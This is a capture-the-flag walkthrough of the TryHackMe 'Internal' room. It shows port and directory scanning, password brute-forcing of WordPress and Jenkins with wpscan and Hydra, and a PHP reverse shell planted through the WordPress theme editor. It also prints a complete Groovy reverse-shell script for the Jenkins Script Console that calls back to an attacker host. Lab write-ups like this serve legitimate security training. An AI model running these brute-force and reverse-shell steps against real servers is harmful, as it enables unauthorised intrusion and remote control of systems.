# Internal

Link: [Internal](https://tryhackme.com/room/internal)

## High-Level Overview

Penetration Testing Challenge

## Tools Needed

* Nmap
* Gobuster
* Wpscan
* Nc
* OWASP ZAP

## Walkthrough

```bash
$ sudo nano /etc/hosts
# MACHINE:IP    internal.thm
```

After starting the machine, we will perform initial scans using `nmap`:

```bash
$ sudo nmap -sS -p- -Pn -A -vv -T5 internal.thm
$ sudo nmap -sU -Pn -p- -T5 -vv internal.thm --max-rtt-timeout 500ms --initial-rtt-timeout 250ms --max-retries 2
```

We can see that the following ports & services are in use:

* 22 - ssh
* 80 - http

Performing a vulnerability scan using `nmap` on the identified ports to see if we can exploit any CVEs:

```bash
$ git clone https://github.com/scipag/vulscan
$ sudo nmap -p 22,80 -Pn -A -vv -T5 --script=vulscan/vulscan.nse internal.thm
```

Since we have a web application running, we can run `gobuster` and see if we have any interesting results:

```bash
$ gobuster dir -u http://internal.thm -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php, php5, htm, html
$ gobuster vhost -u http://internal.thm -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt --exclude-length 422
```

We are greeted with a Apache2 landing page if we visit `http://internal.thm` in our browser.

However, in our gobuster scan we can see a few interesting results: `/blog`, `/wordpress`, `/javascript`, `/phpmyadmin`.

Performing additional enumeration using `gobuster` on the `/blog` page:

```bash
$ gobuster dir -u http://internal.thm/blog -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php, php5, htm, html
```

Here we can also see a login portal located at `http://internal.thm/blog/wp-login.php`.

Seems like we are dealing with Wordpress.

We can use `wpscan` to see if there are any vulnerable plugins or other interesting information:

```bash
$ wpscan --url http://internal.thm/blog -e vp,u
```

We were able to find a valid username, `admin`. Knowing this, we can use `wpscan` again, but this time we will see if we can get this user's password:

```bash
$ wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

After about 1 minute, we can see that a password has been found: `my2boys`.

We can use the credentials `admin` - `my2boys` to log in the admin dashboard by visiting the URL `http://internal.thm/blog/wp-login.php/` in our browser.

Now that we have access to the CMS, we explore the functionalities of the application. Going to all the posts, we see there is a post that wasn't published. Opening it takes us to `http://internal.thm/blog/wp-admin/post.php?post=5&action=edit`, where we can see another set of credentials is revealed: `william` - `arnold147`. However, it seems that we cannot use these credentials for either WordPress or SSH.

To get access to this machine, we will try uploading a php reverse shell by using the Theme Editor feature of WordPress. First we download a php reverse shell using the command:

```bash
$ git clone https://github.com/pentestmonkey/php-reverse-shell
```

Then, we will change the contents of the `php-reverse-shell.php` file to contain the IP address of our attacking machine.

On the WordPress Dashboard, we will go to `Appearance` > `Theme Editor` > `404`, and replace the contents of this file with the contents of our `php-reverse-shell.php`, then click `Apply`.

On our attacking machine, we will start a `nc` listener using the command:

```bash
$ nc -lvnp 1234
```

To trigger the payload, we must navigate to `http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`.

After doing that, we should have a reverse shell as `www-data`.

Time to perform some enumeration to see if we can escalate privileges.

Looking around the file system, going to the `opt` directory, we can see there is a file `wp-save.txt` that contains some credentials: `aubreanna` - `bubb13guM!@#123`. Additionally, there is another file named `containerd`. With our current user we cannot view the contents of the file.

We can confirm that `aubreanna` is a user on this machine by reading the contents of `/etc/passwd`. We can use these credentials to log in over SSH:

```bash
$ ssh aubreanna@internal.thm 
```

Once we are logged in, we can see our first flag in the current folder at `user.txt`. Additionally, we can see a file called `jenkins.txt`. It contains the message:

```
Internal Jenkins service is running on 172.17.0.2:8080
```

We can verify this using `netstat`:

```bash
$ netstat -ano
```

We can access this service from our attacking machine by using a SSH tunnel:

```bash
$ ssh -L 4444:172.17.0.2:8080 aubreanna@internal.thm
```

From this session, we can see wwe have access to the `docker0` interface `172.17.0.1`.

We can see the `Jenkins` instance running by visiting `http://127.0.0.1:4444/` in our browser.

We can open `BurpSuite` to intercept a login request, and it looks like:

```
POST /j_acegi_security_check HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 57
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8080
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8080/login?from=%2F
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID.c85d0977=node0gr5uffoq9h11nsocp4mi5eap1.node0
Connection: close

j_username=admin&j_password=12345&from=%2F&Submit=Sign+in
```

We can use `Hydra` to brute-force the login form:

```bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 4444 -V http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' -f
```

Seems like the password for the user `admin` is `spongebob`.

After we log in to the `Jenkins` instance, we can go to `Manage Jenkins` on the left side of the dashboard and then find `Script Console`. We can try to exploit the functionality of this feature to get a reverse shell. We can type in the following code:

```
String host="ATTACKER:IP";
int port=1234;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

In a terminal window, we should start a nc listner:

```bash
$ nc -lvnp 1234
```

We should now have a reverse shell as the user `jenkins`. We should enumerate again to see if we can escalate privileges. In the `opt` directory, we find a file `note.txt` that seems to have the root credentials: `root` - `tr0ub13guM!@#123`.

We can use those credentials to log in as `root` over SSH:

```bash
$ ssh root@internal.thm
```

We can see the final flag waiting for us in `root` home directory.